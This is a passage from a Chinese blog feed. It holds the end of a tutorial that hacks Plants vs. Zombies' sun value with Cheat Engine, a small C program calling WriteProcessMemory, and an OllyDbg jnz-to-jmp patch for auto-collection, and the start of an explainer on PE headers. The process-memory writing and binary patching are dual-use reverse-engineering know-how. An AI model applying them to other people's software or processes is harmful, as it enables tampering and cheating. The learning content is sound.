src="/posts/8ba499c5/5.1.3.jpg" class="" title="CE查找存储阳光值的地址"><img src="/posts/8ba499c5/5.1.4.png" class="" title="CE查找存储阳光值的地址"><p>句柄为<code>00600BEE</code>，标题为<code>Plants vs. Zombies 1.2.0.1073 RELEASE</code>，类为<code>MainWindow</code>。</p><p>当然，每次运行的句柄和进程ID都不一样，千万不要把这两个值写死，而是通过API函数自动获取这些信息。</p><p>接下来介绍几个等下要用到的API函数：</p><ul><li>通过<code>GetWindowThreadProcessld()</code>函数找到进程ID。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DWORD <span class="title function_">GetWindowThreadProcessld</span><span class="params">(</span></span><br><span class="line"><span class="params">HWND hwnd,                   <span class="comment">//窗口句柄</span></span></span><br><span class="line"><span class="params">LPDWORD lpdwProcessld        <span class="comment">//接收进程标识的32位值的地址</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><ul><li>通过<code>OpenProcess()</code>函数打开一个已存在的进程对象，并返回进程的句柄。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HANDLE <span class="title function_">OpenProcess</span><span class="params">(</span></span><br><span class="line"><span class="params">DWORD dwDesiredAccess,   <span class="comment">//渴望得到的访问权限（标志）</span></span></span><br><span class="line"><span class="params">BOOL bInheritHandle,     <span class="comment">//是否继承句柄</span></span></span><br><span class="line"><span class="params">DWORD dwProcessId        <span class="comment">//进程标示符</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p><code>dwDesiredAccess</code>可分为以下几种：</p><div class="table-container"><table><thead><tr><th>字段值</th><th>含义</th></tr></thead><tbody><tr><td>PROCESS_ALL_ACCESS</td><td>获取所有权限</td></tr><tr><td>PROCESS_CREATE_PROCESS</td><td>创建进程</td></tr><tr><td>PROCESS_CREATE_THREAD</td><td>创建线程</td></tr><tr><td>PROCESS_DUP_HANDLE</td><td>使用DuplicateHandle()函数复制一个新句柄</td></tr><tr><td>PROCESS_QUERY_INFORMATION</td><td>获取进程的令牌、退出码和优先级等信息</td></tr><tr><td>PROCESS_QUERY_LIMITED_INFORMATION</td><td>获取进程特定的某个信息</td></tr><tr><td>PROCESS_SET_INFORMATION</td><td>设置进程的某种信息</td></tr><tr><td>PROCESS_SET_QUOTA</td><td>使用SetProcessWorkingSetSize()函数设置内存限制</td></tr><tr><td>PROCESS_SUSPEND_RESUME</td><td>暂停或者恢复一个进程</td></tr><tr><td>PROCESS_TERMINATE</td><td>使用Terminate()函数终止进程</td></tr><tr><td>PROCESS_VM_OPERATION</td><td>在进程的地址空间执行操作</td></tr><tr><td>PROCESS_VM_READ</td><td>使用ReadProcessMemory()函数在进程中读取内存</td></tr><tr><td>PROCESS_VM_WRITE</td><td>使用WriteProcessMemory()函数在进程中写入内存</td></tr><tr><td>SYNCHRONIZE</td><td>使用wait()函数等待进程终止</td></tr></tbody></table></div><ul><li>通过<code>WriteProcessMemory()</code>函数写入某一进程的内存区域。注意，直接写入会出现“Access Violation”错误，故需此函数入口区必须可以访问，否则操作失败。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">WriteProcessMemory</span><span class="params">(</span></span><br><span class="line"><span class="params">HANDLE hProcess,                 <span class="comment">//由OpenProcess返回的进程句柄</span></span></span><br><span class="line"><span class="params">LPVOID lpBaseAddress,            <span class="comment">//要写入的内存首地址</span></span></span><br><span class="line"><span class="params">LPVOID lpBuffer,                 <span class="comment">//指向数据当前存放的地址</span></span></span><br><span class="line"><span class="params">DWORD nSize,                     <span class="comment">//数据的长度</span></span></span><br><span class="line"><span class="params">LPDWORD lpNumberOfBytesWritten</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>完整代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//输入值作为修改阳光参数</span></span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line"></span><br><span class="line"><span class="comment">//进程ID</span></span><br><span class="line">DWORD pid;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.找到游戏窗口 窗口类型、窗口标题</span></span><br><span class="line">HWND hwnd = FindWindow(<span class="literal">NULL</span>, <span class="string">L&quot;Plants vs. Zombies 1.2.0.1073 RELEASE&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.通过窗口找到进程ID</span></span><br><span class="line">GetWindowThreadProcessId(hwnd, &amp;pid);</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.通过进程id打开进程</span></span><br><span class="line">HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line"></span><br><span class="line"><span class="comment">//4.通过打开进程修改游戏内容</span></span><br><span class="line">WriteProcessMemory(hProcess, (LPVOID)<span class="number">0x25B42938</span>, (LPVOID)&amp;x, <span class="keyword">sizeof</span>(x), &amp;pid);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>芜湖实现阳光自由了~</p><img src="/posts/8ba499c5/5.1.5.png" class="" title="CE查找存储阳光值的地址"><p>经多次实验发现，每次存储阳光值的地址都不同，所以每次都需要用CE找到其地址再进行修改。</p><p>注意，如果游戏存在地址保护的情况，可以尝试注入进行修改。(我还没到那种水平，遇到再说)</p><h2 id="5-2-OD逆向自动拾取阳光"><a href="#5-2-OD逆向自动拾取阳光" class="headerlink" title="5.2 OD逆向自动拾取阳光"></a>5.2 OD逆向自动拾取阳光</h2><p>拾取阳光的关键是点击鼠标，点击到阳光，阳光值会增加。所以我们希望在阳光出现的时候触发点击阳光事件，初步预测涉及两个call：</p><ul><li>阳光出现call</li><li>判断是否点击到阳光然后增加阳光值call</li></ul><p>使用CE定位阳光值地址，选中该地址右键 -&gt; 找出是什么改写了这个地址。当再次拾取阳光时，阳光值从75变到了100，同时CE的小窗口出现了一条记录。</p><img src="/posts/8ba499c5/5.2.1.png" class="" title="OD逆向自动拾取阳光"><p>选中这条记录，下面会出现相关的汇编指令和当前寄存器的值。eax寄存器存的就是每次拾取阳光增加的数值25。</p><img src="/posts/8ba499c5/5.2.2.png" class="" title="OD逆向自动拾取阳光"><p>CE的工作到这里就结束了，接下来将游戏载入OD，定位到<code>0043A7F5</code>处，下断运行。当鼠标点击拾取阳光后，程序停在断点处。</p><img src="/posts/8ba499c5/5.2.3.png" class="" title="OD逆向自动拾取阳光"><p>在查看上面的一连串跳转指令中，发现有个jnz跳过了“增加阳光值”的操作。但给它下断运行，捡了几次阳光，都没有经过这个跳转指令，所以暂时先不管它。</p><img src="/posts/8ba499c5/5.2.5.png" class="" title="OD逆向自动拾取阳光"><p>往上拉拉发现<code>0043A7F5</code>所在的函数的功能仅仅是改变数据段中的阳光值。Ctrl + F9 执行到返回，F7 去到它的上一层函数。发现这个jnz指令有可能会绕过增加阳光值call，给它下个断点，运行几次。</p><img src="/posts/8ba499c5/5.2.4.png" class="" title="OD逆向自动拾取阳光"><p>发现阳光每往左上方移一段路程就要经过这个jnz指令，直到阳光到达指定位置才进入增加阳光值的call。</p><img src="/posts/8ba499c5/5.2.6.png" class="" title="OD逆向自动拾取阳光"><p>那这个jnz指令可以不管它，把它的断点取消。继续返回到父函数，看到有一个jnz指令可以跳到增加阳光call，下断运行。(那些call + jmp指令我们基本不会去动的，否则很容易导致程序运行出错)</p><img src="/posts/8ba499c5/5.2.7.png" class="" title="OD逆向自动拾取阳光"><p>此时阳光已经出现了，但jnz跳转没有实现，也就是还不能进入增加阳光call。</p><img src="/posts/8ba499c5/5.2.8.png" class="" title="OD逆向自动拾取阳光"><p>那怎样才能进入呢？对玩家来说，肯定是要用鼠标点击阳光才能增加阳光值。也就是触发鼠标点击阳光事件才能让jnz跳转指令实现。那我们要实现自动拾取功能，也就是鼠标不点击阳光也能使阳光值增加，怎么办？让这个jnz指令失去它的判断功能，改为无条件跳转指令jmp。</p><p>然后就会发现阳光一出现就被迅速移到指定位置，增加阳光值啦~</p><p>(注意，新手教程一定要点击一下阳光才能继续游戏)</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;现在就要跟随 &lt;a href=&quot;https://blog.csdn.net/Eastmount&quot;&gt;Eastmount&lt;/a&gt; 老师学习系统安全与恶意代码分析了，是的，终于要真正的系统地学习了~加油小凉！&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向分析" scheme="http://example.com/tags/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    
    <category term="恶意代码分析" scheme="http://example.com/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
    <category term="系统安全" scheme="http://example.com/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>PE结构</title>
    <link href="http://example.com/posts/4dec66bb.html"/>
    <id>http://example.com/posts/4dec66bb.html</id>
    <published>2022-05-17T06:31:06.671Z</published>
    <updated>2022-05-20T07:47:14.309Z</updated>
    
    <content type="html"><![CDATA[<p>Windows逆向最基础的就是要对PE结构烂熟于心，我之前做了很多题又怎样呢，还是对PE结构一知半解，地基打不好就别梦想盖高楼。知其然知其所以然，千万不要图“快”而忽略一些重要的细节，慢就是快，这也是我这段时间悟出来的道理。</p><span id="more"></span><h1 id="1-PE的基本概念"><a href="#1-PE的基本概念" class="headerlink" title="1. PE的基本概念"></a>1. PE的基本概念</h1><p>EXE和DLL文件之间的区别完全是语义上的，因为它们使用的是完全相同的PE格式，而唯一的区别就是用一个字段标识出这个文件是EXE还是DLL。</p><p>64位Windows只是对PE格式做了一些简单的修饰，格式为PE32+，并没有任何新的结构加进去，改变的只是将32位字段扩展为64位。</p><p>PE格式的定义主要位于头文件<code>winnt.h</code>，这个头文件几乎能找到关于PE文件的所有定义。</p><p>PE文件中的数据结构一般都有32位和64位之分，一般名称上会表现出来，例如：<code>IMAGE_NT_HEADERS32</code>或<code>IMAGE_NT_HEADER64</code>。</p><img src="/posts/4dec66bb/PE%E6%96%87%E4%BB%B6%E6%A1%86%E6%9E%B6%E7%BB%93%E6%9E%84.jpg" class="" title="PE文件框架结构"><p>PE文件使用的是一个平面地址空间，所有代码和数据都合并在一起，组成一个很大的结构。文件的内容被分割为不同的区块，块中包含代码或数据。各个区块按页边界来对齐，区块没有大小限制，是一个连续的结构。此外，每个块有自己在内存中的一套属性，比如区块是否包含代码、是否只读或可读可写等。</p><p>PE文件不是作为单一内存映射文件被装入内存的。Windows加载器(又称PE装载器)遍历PE文件并决定文件的哪一部分被映射，这种映射方式是将文件较高的偏移位置映射到较高的内存地址中。当磁盘文件一旦被装入内存中，磁盘上的数据结构布局和内存中的数据结构布局是一致的。但数据之间的相对位置可能改变，其某项偏移地址可能不同于原始的偏移地址。</p><img src="/posts/4dec66bb/PE%E6%96%87%E4%BB%B6%E6%A1%86%E6%9E%B6%E7%BB%93%E6%9E%84%E5%9B%BE.png" class="" title="PE文件框架结构图"><p>由上图可以看出，文件被映射到内存，DOS文件头、PE文件头、区块表的偏移位置和大小都没有发生改变。而各区块映射到内存后，其偏移位置发生了改变。</p><p>当PE文件被Windows加载器加载到内存后，内存中的PE文件称之为模块(module)。映射文件的起始地址被称之为模块的句柄(handle)。</p><p>在Windows NT中，获取了模块的句柄相当于获取了基地址，获取了基地址相当于获取了PE结构的文件头。</p><ul><li>基地址(ImageBase)：整个PE结构中的头地址，也就是模块的句柄。可用<code>HMODULE GetModuleHandle(LPCTSTR lpModuleName);</code>去获取模块的句柄。</li><li>文件偏移地址(File Offset Address)：当PE文件存放在磁盘中，各个区块对于文件头的相对偏移地址，文件头的起始地址从0开始。</li><li>虚拟地址(Virtual Address)：PE文件映射到内存中会发生比例的变化，导致与在磁盘中的地址不一致，这个内存中的地址就是虚拟地址。</li><li>相对虚拟地址(Relative Virtual Address)：相对于基地址的偏移。</li></ul><h1 id="2-MS-DOS头部"><a href="#2-MS-DOS头部" class="headerlink" title="2. MS-DOS头部"></a>2. MS-DOS头部</h1><p>每个PE文件是以一个DOS程序开始的，有了它，一旦程序在DOS下执行，DOS才能识别出这是有效的执行体。</p><p>PE文件的第一个字节起始于一个传统的MS-DOS头部，被称作<code>IMAGE_DOS_HEADER</code>。</p><h2 id="2-1-IMAGE-DOS-HEADER"><a href="#2-1-IMAGE-DOS-HEADER" class="headerlink" title="2.1 IMAGE_DOS_HEADER"></a>2.1 IMAGE_DOS_HEADER</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_DOS_HEADER STRUCT </span><br><span class="line">&#123; </span><br><span class="line">    +<span class="number">00</span>h WORD e_magic      <span class="comment">// Magic DOS signature MZ(4Dh 5Ah)  DOS可执行文件标志</span></span><br><span class="line">    +<span class="number">02</span>h WORD e_cblp      <span class="comment">// Bytes on last page of file   </span></span><br><span class="line">    +<span class="number">04</span>h WORD e_cp       <span class="comment">// Pages in file</span></span><br><span class="line">    +<span class="number">06</span>h WORD e_crlc       <span class="comment">// Relocations</span></span><br><span class="line">    +<span class="number">08</span>h WORD e_cparhdr    <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">    +<span class="number">0</span>ah WORD e_minalloc   <span class="comment">// Minimun extra paragraphs needs</span></span><br><span class="line">    +<span class="number">0</span>ch WORD e_maxalloc <span class="comment">// Maximun extra paragraphs needs</span></span><br><span class="line">    +<span class="number">0</span>eh WORD e_ss         <span class="comment">// intial(relative)SS value     DOS代码的初始化堆栈SS </span></span><br><span class="line">    +<span class="number">10</span>h WORD e_sp         <span class="comment">// intial SP value     DOS代码的初始化堆栈指针SP </span></span><br><span class="line">    +<span class="number">12</span>h WORD e_csum       <span class="comment">// Checksum </span></span><br><span class="line">    +<span class="number">14</span>h WORD e_ip        <span class="comment">// intial IP value  DOS代码的初始化指令入口[指针IP] </span></span><br><span class="line">    +<span class="number">16</span>h WORD e_cs         <span class="comment">// intial(relative)CS value    DOS代码的初始堆栈入口 </span></span><br><span class="line">    +<span class="number">18</span>h WORD e_lfarlc     <span class="comment">// File Address of relocation table </span></span><br><span class="line">    +<span class="number">1</span>ah WORD e_ovno      <span class="comment">//   Overlay number </span></span><br><span class="line">    +<span class="number">1</span>ch WORD e_res[<span class="number">4</span>]     <span class="comment">// Reserved words </span></span><br><span class="line">    +<span class="number">24</span>h WORD e_oemid      <span class="comment">//   OEM identifier(for e_oeminfo) </span></span><br><span class="line">    +<span class="number">26</span>h WORD e_oeminfo   <span class="comment">//  OEM information;e_oemid specific  </span></span><br><span class="line">    +<span class="number">29</span>h WORD e_res2[<span class="number">10</span>]   <span class="comment">//  Reserved words </span></span><br><span class="line">    +<span class="number">3</span>ch DWORD e_lfanew    <span class="comment">// Offset to start of PE header  指向PE文件头</span></span><br><span class="line">&#125;IMAGE_DOS_HEADER ENDS</span><br></pre></td></tr></table></figure><p>两个重要字段：</p><ul><li>e_magic：必须为MZ(4D 5A)开头，大小为2个字节。</li><li>e_lfanew：PE文件头的起始偏移地址，大小为4个字节。</li></ul><p>DOS头后跟一个DOS stub数据，是链接器链接执行文件的时候加入的部分数据，一般是“This program must be run under Microsoft Windows”。这个可以通过修改链接器的设置来修改成自己定义的数据。</p><h1 id="3-PE文件头"><a href="#3-PE文件头" class="headerlink" title="3. PE文件头"></a>3. PE文件头</h1><p>紧跟着DOS stub的是PE头文件(PE Header)。PE Header是PE相关结构NT映像头(<code>IMAGE_NT_HEADER</code>)的简称，其中包含许多PE装载器用到的重要字段。执行体在支持PE文件结构的操作系统中执行时，PE装载器将从<code>IMAGE_DOS_HEADER</code>结构中的<code>e_lfanew</code>字段里找到PE Header的起始偏移量，加上基地址得到PE文件头的指针。</p><script type="math/tex; mode=display">PNTHeader = ImageBase + (dosHeader\to e\_lfanew)</script><p>PE头的数据结构被定义为<code>IMAGE_NT_HEADERS</code>。</p><h2 id="3-1-IMAGE-NT-HEADERS"><a href="#3-1-IMAGE-NT-HEADERS" class="headerlink" title="3.1 IMAGE_NT_HEADERS"></a>3.1 IMAGE_NT_HEADERS</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_NT_HEADERS STRUCT</span><br><span class="line">&#123;</span><br><span class="line">  +<span class="number">0</span>h     DWORD Signature</span><br><span class="line">  +<span class="number">4</span>h     IMAGE_FILE_HEADER FileHeader</span><br><span class="line">  +<span class="number">18</span>h    IMAGE_OPTIONAL_HEADER32 OptionalHeader</span><br><span class="line">&#125;IMAGE_NT_HEADERS ENDS</span><br></pre></td></tr></table></figure><ul><li>Signature：在一个有效的PE文件里，被设置为00004550h，也就是“PE..”，标志这是PE文件头的开始。</li><li>FileHeader：映像头文件结构包含了文件的物理层信息及文件属性，占20字节。</li><li>OptionalHeader：可选映像头是一个可选的结构，实际上<code>IMAGE_FILE_HEADER</code>结构不足以定义PE文件属性，因此可选映像头中定义了更多的数据。总共224个字节，最后128个字节为数据目录(Data Directory)。</li></ul><h2 id="3-2-IMAGE-FILE-HEADER"><a href="#3-2-IMAGE-FILE-HEADER" class="headerlink" title="3.2 IMAGE_FILE_HEADER"></a>3.2 IMAGE_FILE_HEADER</h2><p>从“+4h”开始是相对于<code>IMAGE_NT_HEADERS</code>结构中的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line">  +<span class="number">4</span>h   WORD    Machine;<span class="comment">//运行平台</span></span><br><span class="line">  +<span class="number">6</span>h   WORD    NumberOfSections;<span class="comment">//文件的区块数目</span></span><br><span class="line">  +<span class="number">8</span>h   DWORD   TimeDateStamp;<span class="comment">//文件创建日期和时间</span></span><br><span class="line">  +<span class="number">0</span>Ch  DWORD   PointerToSymbolTable;<span class="comment">//指向符号表（用于调试）</span></span><br><span class="line">  +<span class="number">10</span>h  DWORD   NumberOfSymbols;<span class="comment">//符号表中符号个数（用于调试）</span></span><br><span class="line">  +<span class="number">14</span>h  WORD    SizeOfOptionalHeader;<span class="comment">//IMAGE_OPTIONAL_HEADER32结构大小</span></span><br><span class="line">  +<span class="number">16</span>h  WORD    Characteristics;<span class="comment">//文件属性</span></span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><ul><li><p>Machine：可执行文件的目标CPU类型。</p><p>| Value                                | Meaning       |<br>| —————————————————— | ——————- |<br>| IMAGE_FILE_MACHINE_I386<br />0x014c  | x86           |<br>| IMAGE_FILE_MACHINE_IA64<br />0x0200  | Intel Itanium |<br>| IMAGE_FILE_MACHINE_AMD64<br />0x8664 | x64           |</p></li><li><p>NumberOfSections：区块的数目。(区块表是紧跟在<code>IMAGE_NT_HEADERS</code>后面的)</p></li><li><p>TimeDataStamp：表明文件是何时被创建的。这个值是自1970-1-1以来用格林威治时间计算的秒数。</p></li><li><p>PointerToSymbolTable：COFF符号表的文件偏移位置，现在基本没用了。</p></li><li><p>NumberOfSymbols：如果有COFF符号表，它代表其中的符号数目，COFF符号是一个大小固定的结构，如果想找到COFF符号表的结束位置，则需要这个变量。</p></li><li><p>SizeOfOptionalHeader：紧跟着<code>IMAGE_FILE_HEADER</code>后面的数据结构(<code>IMAGE_OPTIONAL_HEADER</code>)的大小。对于32位PE文件，这个值通常为00E0h，对于64位，值为00F0h。</p></li><li><p>Characteristics：文件属性，有选择地通过几个值可以运算得到。这些标志的有效值是定义于<code>winnt.h</code>内的<code>IMAGE_FILE_xxx</code>的值，具体含义见下表。普通EXE文件的字段值一般为0100h，DLL文件值为210Eh。多种属性可通过“或运算”同时拥有。</p><p>| Value                                         | Meaning                                                      |<br>| ——————————————————————- | —————————————————————————————— |<br>| IMAGE_FILE_RELOCS_STRIPPED<br/>0x0001         | Relocation information was stripped from the file. The file must be loaded at its preferredbase address. If the base address is notavailable, the loader reports an error. |<br>| IMAGE_FILE_EXECUTABLE_IMAGE<br/>0x0002        | The file is executable (there are no unresolved external references). |<br>| IMAGE_FILE_LINE_NUMS_STRIPPED<br/>0x0004      | COFF line numbers were stripped from the file.               |<br>| IMAGE_FILE_LOCAL_SYMS_STRIPPED<br/>0x0008     | COFF symbol table entries were stripped from file.           |<br>| IMAGE_FILE_AGGRESIVE_WS_TRIM<br/>0x0010       | Aggressively trim the working set. This value is obsolete as of Windows 2000. |<br>| IMAGE_FILE_LARGE_ADDRESS_AWARE<br/>0x0020     | The application can handle addresses larger than 2 GB.       |<br>| IMAGE_FILE_BYTES_REVERSED_LO<br/>0x0080       | The bytes of the word are reversed. This flag is obsolete.   |<br>| IMAGE_FILE_32BIT_MACHINE<br/>0x0100           | The computer supports 32-bit words.                          |<br>| IMAGE_FILE_DEBUG_STRIPPED<br/>0x0200          | Debugging information was removed and stored separately in another file. |<br>| IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP<br/>0x0400 | If the image is on removable media, copy it toand run it from the swap file. |<br>| IMAGE_FILE_NET_RUN_FROM_SWAP<br/>0x0800       | If the image is on the network, copy it to and run it from the swap file. |<br>| IMAGE_FILE_SYSTEM<br/>0x1000                  | The image is a system file.                                  |<br>| IMAGE_FILE_DLL<br/>0x2000                     | The image is a DLL file. While it is an executable file, it cannot be run directly. |<br>| IMAGE_FILE_UP_SYSTEM_ONLY<br/>0x4000          | The file should be run only on a uniprocessor computer.      |<br>| IMAGE_FILE_BYTES_REVERSED_HI<br/>0x8000       | The bytes of the word are reversed. This flag is obsolete.   |</p></li></ul><h2 id="3-3-IMAGE-OPTIONAL-HEADER32"><a href="#3-3-IMAGE-OPTIONAL-HEADER32" class="headerlink" title="3.3 IMAGE_OPTIONAL_HEADER32"></a>3.3 IMAGE_OPTIONAL_HEADER32</h2><p>从“+18h”是相对于<code>IMAGE_NT_HEADERS</code>结构中的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">  +<span class="number">18</span>h  WORD    Magic;<span class="comment">//标志字</span></span><br><span class="line">  +<span class="number">1</span>Ah  BYTE    MajorLinkerVersion;<span class="comment">//链接器主版本号</span></span><br><span class="line">  +<span class="number">1B</span>h  BYTE    MinorLinkerVersion;<span class="comment">//链接器次版本号</span></span><br><span class="line">  +<span class="number">1</span>Ch  DWORD   SizeOfCode;<span class="comment">//所有含有代码表的总大小</span></span><br><span class="line">  +<span class="number">20</span>h  DWORD   SizeOfInitializedData;<span class="comment">//所有初始化数据表总大小</span></span><br><span class="line">  +<span class="number">24</span>h  DWORD   SizeOfUninitializedData;<span class="comment">//所有未初始化数据表总大小</span></span><br><span class="line">  +<span class="number">28</span>h  DWORD   AddressOfEntryPoint;<span class="comment">//程序执行入口RVA【重要】</span></span><br><span class="line">  +<span class="number">2</span>Ch  DWORD   BaseOfCode;<span class="comment">//代码表起始RVA</span></span><br><span class="line">  +<span class="number">30</span>h  DWORD   BaseOfData;<span class="comment">//数据表起始RVA</span></span><br><span class="line">    <span class="comment">//以下属于NT结构增加的领域</span></span><br><span class="line">  +<span class="number">34</span>h  DWORD   ImageBase;<span class="comment">//程序默认装入基地址【重要】</span></span><br><span class="line">  +<span class="number">38</span>h  DWORD   SectionAlignment;<span class="comment">//内存中表的对齐大小【重要】</span></span><br><span class="line">  +<span class="number">3</span>Ch  DWORD   FileAlignment;<span class="comment">//文件中表的对齐大小【重要】</span></span><br><span class="line">  +<span class="number">40</span>h  WORD    MajorOperatingSystemVersion;<span class="comment">//操作系统主版本号</span></span><br><span class="line">  +<span class="number">42</span>h  WORD    MinorOperatingSystemVersion;<span class="comment">//操作系统次版本号</span></span><br><span class="line">  +<span class="number">44</span>h  WORD    MajorImageVersion;<span class="comment">//用户自定义主版本号</span></span><br><span class="line">  +<span class="number">46</span>h  WORD    MinorImageVersion;<span class="comment">//用户自定义次版本号</span></span><br><span class="line">  +<span class="number">48</span>h  WORD    MajorSubsystemVersion;<span class="comment">//所需要子系统主版本号</span></span><br><span class="line">  +<span class="number">4</span>Ah  WORD    MinorSubsystemVersion;<span class="comment">//所需要子系统次版本号</span></span><br><span class="line">  +<span class="number">4</span>Ch  DWORD   Win32VersionValue;<span class="comment">//保留，通常设置为0</span></span><br><span class="line">  +<span class="number">50</span>h  DWORD   SizeOfImage;<span class="comment">//映像装入内存后的总大小</span></span><br><span class="line">  +<span class="number">54</span>h  DWORD   SizeOfHeaders;<span class="comment">//DOS头、PE头、区块表总大小</span></span><br><span class="line">  +<span class="number">58</span>h  DWORD   CheckSum;<span class="comment">//映像校验和</span></span><br><span class="line">  +<span class="number">5</span>Ch  WORD    Subsystem;<span class="comment">//可执行文件期望的子系统【重要】</span></span><br><span class="line">  +<span class="number">5</span>Eh  WORD    DllCharacteristics;<span class="comment">//显示DLL特性的旗标</span></span><br><span class="line">  +<span class="number">60</span>h  DWORD   SizeOfStackReserve;<span class="comment">//初始化堆栈大小</span></span><br><span class="line">  +<span class="number">64</span>h  DWORD   SizeOfStackCommit;<span class="comment">//初始化实际提交堆栈大小</span></span><br><span class="line">  +<span class="number">68</span>h  DWORD   SizeOfHeapReserve;<span class="comment">//初始化保留堆栈大小</span></span><br><span class="line">  +<span class="number">6</span>Ch  DWORD   SizeOfHeapCommit;<span class="comment">//初始化实际保留堆栈大小</span></span><br><span class="line">  +<span class="number">70</span>h  DWORD   LoaderFlags;<span class="comment">//与调试相关，默认值为0</span></span><br><span class="line">  +<span class="number">74</span>h  DWORD   NumberOfRvaAndSizes;<span class="comment">//数据目录表的项数(总是16)</span></span><br><span class="line">  +<span class="number">78</span>h  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];<span class="comment">//数据目录表【重要】</span></span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, 